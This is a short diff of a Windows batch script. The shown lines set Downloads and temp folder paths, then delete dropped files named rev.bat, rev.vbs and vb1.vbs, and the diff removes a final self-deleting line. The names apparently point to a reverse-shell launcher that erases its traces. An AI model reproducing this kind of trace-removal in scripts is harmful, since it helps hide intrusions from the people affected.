@@ -1,4 +1,3 @@
-
 @echo off
 set "downloads_dir=%USERPROFILE%\Downloads"
 set "temp_dir=%temp%"
@@ -20,4 +19,3 @@ del rev.bat
 del rev.vbs
 del vb1.vbs
 del D:\vb.vbs
-del "%~f0"
